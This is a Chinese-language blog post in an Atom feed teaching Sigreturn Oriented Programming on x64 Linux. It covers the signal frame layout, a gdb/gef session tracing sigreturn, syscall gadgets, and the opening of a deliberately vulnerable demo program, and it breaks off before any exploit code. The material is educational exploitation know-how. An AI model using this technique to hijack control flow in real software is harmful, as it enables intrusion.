<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Asan&#39;world</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://asanzjx.github.io/"/>
  <updated>2018-10-21T08:04:28.941Z</updated>
  <id>https://asanzjx.github.io/</id>
  
  <author>
    <name>Asan</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>srop 利用方式</title>
    <link href="https://asanzjx.github.io/2018/10/21/srop_detail/"/>
    <id>https://asanzjx.github.io/2018/10/21/srop_detail/</id>
    <published>2018-10-21T08:00:00.000Z</published>
    <updated>2018-10-21T08:04:28.941Z</updated>
    
    <content type="html"><![CDATA[<p>Sigreturn Oriented Programming，基于 signal mechanism 的内存溢出攻击</p><p>缺陷可利用：</p><ul><li>进程 context info 及 rt_sigreturn addr 保存在用户进程栈空间，用户进程可读写</li><li>内核未判断之前保存的 signal frame 和 恢复时的 signal frame</li></ul><p>那么利用思路就很很清晰了，只要控制了用户进程的栈空间，就可以伪造 signal frame ，劫持控制流</p><p>本文简单介绍 srop 中有关 signal 和 debugger signal , syscall 的要点，最后给出一个基于 srop 利用的 x64 simple demo。</p><h1><span id="signal-mechanism-下内核与进程的交互">Signal mechanism 下内核与进程的交互</span></h1><p>在进程表的表项中有一个软中断信号域，该域中每一位对应一个信号，当有信号发送给进程时，对应位置位。</p><p>进程间的信号是通过内核来转发，A 进程 - 内核 - B 进程，当然进程自己也会触发信号。接下来的讨论是内核收到这个信号的处理流程。</p><p><img src="/images/signal_k2p.png" alt="Signal mechanism 下内核与进程的交互"></p><p>如上图所述，大概分 4 部分：</p><ol><li>内核向 B 进程 deliver a signal,该进程响应这个 signal ,暂时挂起 (suspend) , 控制权交给内核</li><li>内核为该进程保存相应的 context，跳转到之前注册好的 signal handle 中处理相应的 signal,此时在 user space</li><li>当 signal handle 返回之后,内核为该进程恢复保存的上下文</li><li>控制权交给 B 进程，恢复执行</li></ol><p>Signal Frame: 即保存进程 context info 的栈内存空间，x64 布局如下：</p><table><thead><tr><th style="text-align:center">Offset</th><th style="text-align:center">reg</th><th style="text-align:center">reg</th></tr></thead><tbody><tr><td style="text-align:center">0x00</td><td style="text-align:center">rt_sigreturn</td><td style="text-align:center">uc_flags</td></tr><tr><td style="text-align:center">0x10</td><td style="text-align:center">&amp;uc</td><td style="text-align:center">uc_stack.ss_sp</td></tr><tr><td style="text-align:center">0x20</td><td style="text-align:center">uc_stack.ss_flags</td><td style="text-align:center">uc_stack.ss_size</td></tr><tr><td style="text-align:center">0x30</td><td style="text-align:center">r8</td><td style="text-align:center">r9</td></tr><tr><td style="text-align:center">0x40</td><td style="text-align:center">r10</td><td style="text-align:center">r11</td></tr><tr><td style="text-align:center">0x50</td><td style="text-align:center">r12</td><td style="text-align:center">r13</td></tr><tr><td style="text-align:center">0x60</td><td style="text-align:center">r14</td><td style="text-align:center">r15</td></tr><tr><td style="text-align:center">0x70</td><td style="text-align:center">rdi</td><td style="text-align:center">rsi</td></tr><tr><td style="text-align:center">0x80</td><td style="text-align:center">rbp</td><td style="text-align:center">rbx</td></tr><tr><td style="text-align:center">0x90</td><td style="text-align:center">rdx</td><td style="text-align:center">rax</td></tr><tr><td style="text-align:center">0xa0</td><td style="text-align:center">rcx</td><td style="text-align:center">rsp</td></tr><tr><td style="text-align:center">0xb0</td><td style="text-align:center">rip</td><td style="text-align:center">eflags</td></tr><tr><td style="text-align:center">0xc0</td><td style="text-align:center">cs/gs/fs</td><td style="text-align:center">err</td></tr><tr><td style="text-align:center">0xd0</td><td style="text-align:center">trapno</td><td style="text-align:center">oldmask(unused)</td></tr><tr><td style="text-align:center">0xe0</td><td style="text-align:center">cr2(segfault addr)</td><td style="text-align:center">&amp;fpstate</td></tr><tr><td style="text-align:center">0xf0</td><td style="text-align:center">__reserved</td><td style="text-align:center">sigmask</td></tr></tbody></table><p>详解下第二步，内核会将进程的 context 保存在<strong>进程的内存空间栈上</strong>，然后在栈顶填上一个返回地址: ‘rt_sigreturn()’,这个函数地址指向的就是 ‘sigreturn’ 系统调用（15 号系统调用）。</p><h1><span id="debugger-signal-and-find-signal-frame-struct">Debugger signal and find signal frame struct</span></h1><p>调试时，需要对 signal 处理进行设置</p><p>系统信号值可通过 kill -l 查阅：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ kill -l</span><br><span class="line"> <span class="number">1</span>) SIGHUP       <span class="number">2</span>) SIGINT       <span class="number">3</span>) SIGQUIT      <span class="number">4</span>) SIGILL       <span class="number">5</span>) SIGTRAP</span><br><span class="line"> <span class="number">6</span>) SIGABRT      <span class="number">7</span>) SIGBUS       <span class="number">8</span>) SIGFPE       <span class="number">9</span>) SIGKILL     <span class="number">10</span>) SIGUSR1</span><br><span class="line"><span class="number">11</span>) SIGSEGV     <span class="number">12</span>) SIGUSR2     <span class="number">13</span>) SIGPIPE     <span class="number">14</span>) SIGALRM     <span class="number">15</span>) SIGTERM</span><br><span class="line"><span class="number">16</span>) SIGSTKFLT   <span class="number">17</span>) SIGCHLD     <span class="number">18</span>) SIGCONT     <span class="number">19</span>) SIGSTOP     <span class="number">20</span>) SIGTSTP</span><br><span class="line"><span class="number">21</span>) SIGTTIN     <span class="number">22</span>) SIGTTOU     <span class="number">23</span>) SIGURG      <span class="number">24</span>) SIGXCPU     <span class="number">25</span>) SIGXFSZ</span><br><span class="line"><span class="number">26</span>) SIGVTALRM   <span class="number">27</span>) SIGPROF     <span class="number">28</span>) SIGWINCH    <span class="number">29</span>) SIGIO       <span class="number">30</span>) SIGPWR</span><br><span class="line"><span class="number">31</span>) SIGSYS      <span class="number">34</span>) SIGRTMIN    <span class="number">35</span>) SIGRTMIN+<span class="number">1</span>  <span class="number">36</span>) SIGRTMIN+<span class="number">2</span>  <span class="number">37</span>) SIGRTMIN+<span class="number">3</span></span><br><span class="line"><span class="number">38</span>) SIGRTMIN+<span class="number">4</span>  <span class="number">39</span>) SIGRTMIN+<span class="number">5</span>  <span class="number">40</span>) SIGRTMIN+<span class="number">6</span>  <span class="number">41</span>) SIGRTMIN+<span class="number">7</span>  <span class="number">42</span>) SIGRTMIN+<span class="number">8</span></span><br><span class="line"><span class="number">43</span>) SIGRTMIN+<span class="number">9</span>  <span class="number">44</span>) SIGRTMIN+<span class="number">10</span> <span class="number">45</span>) SIGRTMIN+<span class="number">11</span> <span class="number">46</span>) SIGRTMIN+<span class="number">12</span> <span class="number">47</span>) SIGRTMIN+<span class="number">13</span></span><br><span class="line"><span class="number">48</span>) SIGRTMIN+<span class="number">14</span> <span class="number">49</span>) SIGRTMIN+<span class="number">15</span> <span class="number">50</span>) SIGRTMAX<span class="number">-14</span> <span class="number">51</span>) SIGRTMAX<span class="number">-13</span> <span class="number">52</span>) SIGRTMAX<span class="number">-12</span></span><br><span class="line"><span class="number">53</span>) SIGRTMAX<span class="number">-11</span> <span class="number">54</span>) SIGRTMAX<span class="number">-10</span> <span class="number">55</span>) SIGRTMAX<span class="number">-9</span>  <span class="number">56</span>) SIGRTMAX<span class="number">-8</span>  <span class="number">57</span>) SIGRTMAX<span class="number">-7</span></span><br><span class="line"><span class="number">58</span>) SIGRTMAX<span class="number">-6</span>  <span class="number">59</span>) SIGRTMAX<span class="number">-5</span>  <span class="number">60</span>) SIGRTMAX<span class="number">-4</span>  <span class="number">61</span>) SIGRTMAX<span class="number">-3</span>  <span class="number">62</span>) SIGRTMAX<span class="number">-2</span></span><br><span class="line"><span class="number">63</span>) SIGRTMAX<span class="number">-1</span>  <span class="number">64</span>) SIGRTMAX</span><br></pre></td></tr></table></figure><p>测试代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"># gcc -o debug_sig ./debug_sig.c -g</span><br><span class="line">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handle_signal</span><span class="params">(<span class="keyword">int</span> signum)</span></span><br><span class="line"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"handling signal: %d\n"</span>, signum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">signal(SIGINT, (<span class="keyword">void</span> *)handle_signal);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"catch me if you can\n"</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* struct definition for debugging purpose */</span></span><br><span class="line"><span class="comment">// struct sigcontext sigcontext;</span></span><br></pre></td></tr></table></figure></p><p>结合代码 Linux source code about sigcontext struct：<a href="https://elixir.bootlin.com/linux/v4.6/source/arch/x86/include/uapi/asm/sigcontext.h" target="_blank" rel="external">https://elixir.bootlin.com/linux/v4.6/source/arch/x86/include/uapi/asm/sigcontext.h</a></p><p>调试过程如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; handle SIGINT pass nostop</span><br><span class="line">Signal        Stop      Print   Pass to program Description</span><br><span class="line">SIGINT        No        Yes     Yes             Interrupt</span><br><span class="line"></span><br><span class="line">gef&gt; b handle_signal</span><br><span class="line"></span><br><span class="line">gef&gt; r</span><br><span class="line">Starting program: ...</span><br><span class="line">catch me if you can</span><br><span class="line"></span><br><span class="line">Ctrl+C</span><br><span class="line">Program received signal SIGINT, Interrupt.</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line">$rax   : 0x14</span><br><span class="line">$rbx   : 0x0</span><br><span class="line">$rcx   : 0x7fffff3f9b58      →  0x0000000008402210  →  0x0000000000000000</span><br><span class="line">$rdx   : 0x0</span><br><span class="line">$rsp   : 0x7ffffffedbb8      →  0x00007fffff093060  →  &lt;__restore_rt+0&gt; mov rax, 0xf</span><br><span class="line">$rbp   : 0x7ffffffee250      →  0x0000000008000790  →  &lt;__libc_csu_init+0&gt; push r15</span><br><span class="line">$rsi   : 0x0</span><br><span class="line">$rdi   : 0x2</span><br><span class="line">$rip   : 0x8000740           →  &lt;handle_signal+0&gt; push rbp</span><br><span class="line">$r8    : 0x8402000           →  0x0000000000000000</span><br><span class="line">$r9    : 0x0</span><br><span class="line">$r10   : 0x7fffff3f9b58      →  0x0000000008402210  →  0x0000000000000000</span><br><span class="line">$r11   : 0x7fffff3f9b58      →  0x0000000008402210  →  0x0000000000000000</span><br><span class="line">$r12   : 0x8000610           →  &lt;_start+0&gt; xor ebp, ebp</span><br><span class="line">$r13   : 0x7ffffffee330      →  0x0000000000000001</span><br><span class="line">$r14   : 0x0</span><br><span class="line">$r15   : 0x0</span><br><span class="line">$eflags: [carry PARITY adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$ds: 0x0000  $es: 0x0000  $cs: 0x0033  $fs: 0x0000  $ss: 0x002b  $gs: 0x0000</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">0x00007ffffffedbb8│+0x00: 0x00007fffff093060  →  &lt;__restore_rt+0&gt; mov rax, 0xf  ← $rsp</span><br><span class="line">0x00007ffffffedbc0│+0x08: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbc8│+0x10: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbd0│+0x18: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbd8│+0x20: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbe0│+0x28: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbe8│+0x30: 0x0000000008402000  →  0x0000000000000000</span><br><span class="line">0x00007ffffffedbf0│+0x38: 0x0000000000000000</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────[ code:i386:x86-64 ]────</span><br><span class="line">    0x8000738 &lt;frame_dummy+40&gt; call   rax</span><br><span class="line">    0x800073a &lt;frame_dummy+42&gt; pop    rbp</span><br><span class="line">    0x800073b &lt;frame_dummy+43&gt; jmp    0x8000680 &lt;register_tm_clones&gt;</span><br><span class="line"> →  0x8000740 &lt;handle_signal+0&gt; push   rbp</span><br><span class="line">    0x8000741 &lt;handle_signal+1&gt; mov    rbp, rsp</span><br><span class="line">    0x8000744 &lt;handle_signal+4&gt; sub    rsp, 0x10</span><br><span class="line">    0x8000748 &lt;handle_signal+8&gt; mov    DWORD PTR [rbp-0x4], edi</span><br><span class="line">    0x800074b &lt;handle_signal+11&gt; mov    eax, DWORD PTR [rbp-0x4]</span><br><span class="line">    0x800074e &lt;handle_signal+14&gt; mov    esi, eax</span><br><span class="line">──────────────────────────────────────────────────────────────────────────[ source:./debug_sig.c+9 ]────</span><br><span class="line">      4</span><br><span class="line">      5  #include &lt;stdio.h&gt;</span><br><span class="line">      6  #include &lt;signal.h&gt;</span><br><span class="line">      7</span><br><span class="line">      8  void handle_signal(int signum)</span><br><span class="line"> →    9         &#123;</span><br><span class="line">     10  printf("handling signal: %d\n", signum);</span><br><span class="line">     11  &#125;</span><br><span class="line">     12</span><br><span class="line">     13  int main()&#123;</span><br><span class="line">     14      signal(SIGINT, (void *)handle_signal);</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────[ threads ]────</span><br><span class="line">[#0] Id 1, Name: "debug_sig", stopped, reason: BREAKPOINT</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────[ trace ]────</span><br><span class="line">[#0] 0x8000740 → Name: handle_signal(signum=0x0)</span><br><span class="line">[#1] 0x7fffff093060 → Name: __restore_rt()</span><br><span class="line">[#2] 0x8000785 → Name: main()</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"></span><br><span class="line">Breakpoint 3, handle_signal (signum=0x0) at ./debug_sig.c:9</span><br><span class="line">9       &#123;</span><br><span class="line"></span><br><span class="line">gef➤  p (struct sigcontext)*(0x00007ffffffedbb8+0x30)</span><br><span class="line">$5 = &#123;</span><br><span class="line">  r8 = 0x8402000,</span><br><span class="line">  r9 = 0x0,</span><br><span class="line">  r10 = 0x7fffff3f9b58,</span><br><span class="line">  r11 = 0x7fffff3f9b58,</span><br><span class="line">  r12 = 0x8000610,</span><br><span class="line">  r13 = 0x7ffffffee330,</span><br><span class="line">  r14 = 0x0,</span><br><span class="line">  r15 = 0x0,</span><br><span class="line">  rdi = 0x0,</span><br><span class="line">  rsi = 0x8402010,</span><br><span class="line">  rbp = 0x7ffffffee250,</span><br><span class="line">  rbx = 0x0,</span><br><span class="line">  rdx = 0x7fffff3fb760,</span><br><span class="line">  rax = 0x14,</span><br><span class="line">  rcx = 0x7fffff3f9b58,</span><br><span class="line">  rsp = 0x7ffffffee250,</span><br><span class="line">  rip = 0x8000785,</span><br><span class="line">  eflags = 0x206,</span><br><span class="line">  cs = 0x33,</span><br><span class="line">  gs = 0x2b,</span><br><span class="line">  fs = 0x53,</span><br><span class="line">  __pad0 = 0x0,</span><br><span class="line">  err = 0x0,</span><br><span class="line">  trapno = 0x0,</span><br><span class="line">  oldmask = 0x0,</span><br><span class="line">  cr2 = 0x0,</span><br><span class="line">  &#123;</span><br><span class="line">    fpstate = 0x0,</span><br><span class="line">    __fpstate_word = 0x0</span><br><span class="line">  &#125;,</span><br><span class="line">  __reserved1 = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的寄存器值与当前上下文稍有出入，是因为调用 handler_signal() 函数传参等修改寄存器所致。</p><p>还可以观察 ucontext-&gt;uc_mcontext-&gt;greps 字段，这个也会与 sigcontext 结构体数据一致。也就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; p (<span class="keyword">struct</span> ucontext)*<span class="number">0x00007ffffffedbb8</span></span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; b *0x8000763</span><br><span class="line">gef&gt; c</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line">$rax   : 0x13</span><br><span class="line">$rbx   : 0x0</span><br><span class="line">$rcx   : 0x7fffffed</span><br><span class="line">$rdx   : 0x7fffff3fb760      →  0x0000000000000000</span><br><span class="line">$rsp   : 0x7ffffffedbb8      →  0x00007fffff093060  →  &lt;__restore_rt+0&gt; mov rax, 0xf</span><br><span class="line">$rbp   : 0x7ffffffee250      →  0x0000000008000790  →  &lt;__libc_csu_init+0&gt; push r15</span><br><span class="line">$rsi   : 0x8402010           →  "handling signal: 2"</span><br><span class="line">$rdi   : 0x0</span><br><span class="line">$rip   : 0x8000763           →  &lt;handle_signal+35&gt; ret</span><br><span class="line">$r8    : 0x1</span><br><span class="line">$r9    : 0x13</span><br><span class="line">$r10   : 0x64</span><br><span class="line">$r11   : 0x64</span><br><span class="line">$r12   : 0x8000610           →  &lt;_start+0&gt; xor ebp, ebp</span><br><span class="line">$r13   : 0x7ffffffee330      →  0x0000000000000001</span><br><span class="line">$r14   : 0x0</span><br><span class="line">$r15   : 0x0</span><br><span class="line">$eflags: [carry parity adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$ds: 0x0000  $es: 0x0000  $cs: 0x0033  $fs: 0x0000  $ss: 0x002b  $gs: 0x0000</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">0x00007ffffffedbb8│+0x00: 0x00007fffff093060  →  &lt;__restore_rt+0&gt; mov rax, 0xf  ← $rsp</span><br><span class="line">0x00007ffffffedbc0│+0x08: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbc8│+0x10: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbd0│+0x18: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbd8│+0x20: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbe0│+0x28: 0x0000000000000000</span><br><span class="line">0x00007ffffffedbe8│+0x30: 0x0000000008402000  →  0x0000000000000000</span><br><span class="line">0x00007ffffffedbf0│+0x38: 0x0000000000000000</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────[ code:i386:x86-64 ]────</span><br><span class="line">    0x800075c &lt;handle_signal+28&gt; call   0x80005e0 &lt;printf@plt&gt;</span><br><span class="line">    0x8000761 &lt;handle_signal+33&gt; nop</span><br><span class="line">    0x8000762 &lt;handle_signal+34&gt; leave</span><br><span class="line"> →  0x8000763 &lt;handle_signal+35&gt; ret</span><br><span class="line">   ↳  0x7fffff093060 &lt;__restore_rt+0&gt; mov    rax, 0xf</span><br><span class="line">      0x7fffff093067 &lt;__restore_rt+7&gt; syscall</span><br><span class="line">      0x7fffff093069 &lt;__restore_rt+9&gt; nop    DWORD PTR [rax+0x0]</span><br><span class="line">      0x7fffff093070 &lt;__libc_sigaction+0&gt; sub    rsp, 0xd0</span><br><span class="line">      0x7fffff093077 &lt;__libc_sigaction+7&gt; test   rsi, rsi</span><br><span class="line">      0x7fffff09307a &lt;__libc_sigaction+10&gt; mov    r8, rdx</span><br><span class="line">─────────────────────────────────────────────────────────────────────────[ source:./debug_sig.c+11 ]────</span><br><span class="line">      6  #include &lt;signal.h&gt;</span><br><span class="line">      7</span><br><span class="line">      8  void handle_signal(int signum)</span><br><span class="line">      9  &#123;</span><br><span class="line">     10  printf("handling signal: %d\n", signum);</span><br><span class="line"> →   11         &#125;</span><br><span class="line">     12</span><br><span class="line">     13  int main()&#123;</span><br><span class="line">     14      signal(SIGINT, (void *)handle_signal);</span><br><span class="line">     15      printf("catch me if you can\n");</span><br><span class="line">     16      while(1) &#123;&#125;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────[ threads ]────</span><br><span class="line">[#0] Id 1, Name: "debug_sig", stopped, reason: BREAKPOINT</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────[ trace ]────</span><br><span class="line">[#0] 0x8000763 → Name: handle_signal(signum=0x2)</span><br><span class="line">[#1] 0x7fffff093060 → Name: __restore_rt()</span><br><span class="line">[#2] 0x8000785 → Name: main()</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"></span><br><span class="line">Breakpoint 4, 0x0000000008000763 in handle_signal (signum=0x2) at ./debug_sig.c:11</span><br><span class="line">11      &#125;</span><br></pre></td></tr></table></figure><p>可以看到信号处理函数返回时，调用 __restore_rt() ，也就是在调用 0xf 号系统调用( sigreturn )。</p><h1><span id="syscall-相关">syscall 相关</span></h1><p>主要在于寻找相关的 gadgets 和系统调用参数的传递及返回值</p><p>调用号通过 rax 传递</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rax,<span class="number">0xf</span></span><br><span class="line">ret</span><br><span class="line">...</span><br><span class="line">syscall</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>syscall 调用成功后返回调用号，系统调用失败后值存入 rax，系统调用失败值参阅：<a href="http://www-numi.fnal.gov/offline_software/srt_public_context/WebDocs/Errors/unix_system_errors.html" target="_blank" rel="external">http://www-numi.fnal.gov/offline_software/srt_public_context/WebDocs/Errors/unix_system_errors.html</a></p><p>以 x64 为例，系统调用号可查阅 inclde/generated/asm-offsets.h:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#define __NR_syscall_max 322</span><br><span class="line"></span><br><span class="line">#ifndef _ASM_X86_UNISTD_64_H</span><br><span class="line">#define _ASM_X86_UNISTD_64_H 1</span><br><span class="line"></span><br><span class="line">#define __NR_read 0</span><br><span class="line">#define __NR_write 1</span><br><span class="line">#define __NR_open 2</span><br><span class="line">#define __NR_close 3</span><br><span class="line">#define __NR_stat 4</span><br><span class="line">#define __NR_fstat 5</span><br><span class="line">#define __NR_lstat 6</span><br><span class="line">#define __NR_poll 7</span><br><span class="line">#define __NR_lseek 8</span><br><span class="line">#define __NR_mmap 9</span><br><span class="line">#define __NR_mprotect 10</span><br><span class="line">#define __NR_munmap 11</span><br><span class="line">...</span><br><span class="line">#define __NR_fork 57</span><br><span class="line">#define __NR_vfork 58</span><br><span class="line">#define __NR_execve 59</span><br><span class="line">#define __NR_exit 60</span><br><span class="line">#define __NR_wait4 61</span><br><span class="line">#define __NR_kill 62</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h1><span id="x64simple-demo">x64simple demo</span></h1><p>要点：</p><ul><li>利用 pwntools srop 可快速构造 fake signal frame</li><li>精心布局栈空间，完成 sigreturn 的 rop 后紧跟 fake signal frame</li></ul><p>示例代码如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">* just for srop simple:https://0x00sec.org/t/srop-signals-you-say/2890</span><br><span class="line">* gcc -o x64simple ./x64simple.c -g -no-pie -z execstack</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span 